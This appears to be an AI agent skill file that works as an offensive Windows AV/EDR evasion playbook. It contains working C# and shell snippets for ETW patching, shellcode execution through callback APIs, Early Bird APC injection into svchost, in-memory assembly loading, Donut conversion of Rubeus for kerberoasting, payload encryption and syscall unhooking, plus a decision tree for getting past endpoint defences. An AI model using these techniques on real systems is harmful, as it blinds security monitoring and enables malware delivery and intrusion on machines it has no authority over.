---
name: windows-av-evasion
description: >-
  AV/EDR evasion playbook for Windows. Use when bypassing AMSI, ETW, .NET assembly detection, shellcode execution, process injection, API hooking, and signature-based detection on Windows endpoints.
---

# SKILL: AV/EDR Evasion

## 0. RELATED ROUTING

- [windows-privilege-escalation](../windows-privilege-escalation/SKILL.md)
- [windows-lateral-movement](../windows-lateral-movement/SKILL.md)
- [active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md)

---

## 1. AMSI BYPASS

AMSI inspects PowerShell, .NET, VBScript, JScript, Office macros at runtime.

| Category | Method | Detection Risk |
|---|---|---|
| Memory patching | Patch `AmsiScanBuffer` in `amsi.dll` | Medium |
| Reflection | Modify AMSI init flags via .NET reflection | Medium |
| String obfuscation | Encode/split AMSI trigger strings | Low |
| PowerShell downgrade | Force PS v2 (no AMSI) | Low |
| CLM bypass | Escape Constrained Language Mode | Medium |

```powershell
# PowerShell v2 downgrade (if .NET 2.0 available)
powershell -Version 2
```

---

## 2. ETW BYPASS

```csharp
// Patch EtwEventWrite in ntdll.dll to return immediately
var ntdll = GetModuleHandle("ntdll.dll");
var etwAddr = GetProcAddress(ntdll, "EtwEventWrite");
VirtualProtect(etwAddr, 1, 0x40, out uint oldProtect);
Marshal.WriteByte(etwAddr, 0xC3);  // ret
VirtualProtect(etwAddr, 1, oldProtect, out _);
```

---

## 3. .NET ASSEMBLY LOADING

```csharp
// In-memory Assembly.Load
byte[] assemblyBytes = File.ReadAllBytes("tool.exe");
Assembly assembly = Assembly.Load(assemblyBytes);
assembly.EntryPoint.Invoke(null, new object[] { args });
```

```bash
# Donut: convert .NET EXE to shellcode
donut -f tool.exe -o payload.bin -a 2 -c ToolNamespace.Program -m Main
donut -f Rubeus.exe -o rubeus.bin -a 2 -p "kerberoast /outfile:tgs.txt"
```

```
# C2 execute-assembly
execute-assembly /path/to/Rubeus.exe kerberoast     # Cobalt Strike
execute-assembly /path/to/SharpHound.exe -c all     # Sliver
```

---

## 4. SHELLCODE EXECUTION

```csharp
// VirtualAlloc + Callback (avoids CreateThread)
IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
Marshal.Copy(sc, 0, addr, sc.Length);
EnumWindows(addr, IntPtr.Zero);  // callback APIs execute shellcode
```

Other callback APIs: `EnumChildWindows`, `EnumFonts`, `EnumDesktops`, `CertEnumSystemStore`, `EnumDateFormats`

---

## 5. PROCESS INJECTION

| Technique | APIs Used | OPSEC |
|---|---|---|
| CreateRemoteThread | OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread | Low |
| NtMapViewOfSection | NtCreateSection, NtMapViewOfSection | Medium |
| Process Hollowing | CreateProcess (SUSPENDED), NtUnmapViewOfSection, ResumeThread | Medium |
| Early Bird APC | CreateProcess (SUSPENDED), QueueUserAPC, ResumeThread | Low-Med |
| Module Stomping | LoadLibrary, overwrite .text section | Low |
| Transacted Hollowing | NtCreateTransaction, NtCreateSection | Low |

```csharp
// Early Bird APC Injection
CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", ..., CREATE_SUSPENDED, ..., ref si, ref pi);
IntPtr addr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
WriteProcessMemory(pi.hProcess, addr, sc, (uint)sc.Length, out _);
QueueUserAPC(addr, pi.hThread, IntPtr.Zero);
ResumeThread(pi.hThread);
```

---

## 6. UNHOOKING (BYPASS EDR API HOOKS)

```
Normal: User code → ntdll.dll (HOOKED) → kernel
Direct: User code → syscall instruction → kernel (bypasses hook)
```

| Tool | Method |
|---|---|
| SysWhispers2/3 | Compile-time syscall stubs |
| HellsGate | Runtime syscall number resolution |
| HalosGate | Resolve from neighboring unhooked syscalls |

```csharp
// Fresh ntdll copy from disk to remove all EDR hooks
byte[] cleanNtdll = File.ReadAllBytes(@"C:\Windows\System32\ntdll.dll");
// Overwrite hooked .text section with clean copy
```

---

## 7. PAYLOAD ENCRYPTION

```csharp
// AES encryption
using Aes aes = Aes.Create();
aes.Key = key; aes.IV = iv;
byte[] encrypted = aes.CreateEncryptor().TransformFinalBlock(shellcode, 0, shellcode.Length);

// XOR
for (int i = 0; i < shellcode.Length; i++)
    shellcode[i] ^= key[i % key.Length];
```

Sleep obfuscation (encrypt memory during sleep): **Ekko**, **Foliage**, **DeathSleep**

---

## 8. SIGNATURE EVASION

```csharp
// API hashing (avoid string detection)
IntPtr func = GetProcAddressByHash(module, 0x91AFCA54);  // hash of "VirtualAlloc"
```

| C2 Framework | Key Evasion Features |
|---|---|
| Cobalt Strike | Malleable C2 profiles, sleep jitter, PE evasion |
| Sliver | mTLS/WireGuard/DNS, built-in obfuscation |
| Havoc | Indirect syscalls, sleep obfuscation, module stomping |
| Brute Ratel | Syscall evasion, ETW/AMSI bypass built-in |

---

## 9. DECISION TREE

```
Need to execute on protected host
│
├── PowerShell blocked by AMSI?
│   ├── .NET 2.0 available → PS v2 downgrade (§1)
│   ├── Patch AmsiScanBuffer (§1)
│   └── Reflection-based bypass (§1)
│
├── .NET assembly (Rubeus, SharpHound)?
│   ├── In-memory Assembly.Load (§3)
│   ├── Donut → shellcode (§3)
│   └── C2 execute-assembly (§3)
│
├── Shellcode execution?
│   ├── VirtualAlloc + callback (§4)
│   ├── Process injection by OPSEC (§5)
│   └── Sleep obfuscation (§7)
│
├── EDR hooking ntdll.dll?
│   ├── Direct syscalls: SysWhispers3/HellsGate (§6)
│   └── Fresh ntdll copy (§6)
│
└── All fails → LOLBins: certutil, mshta, regsvr32
```
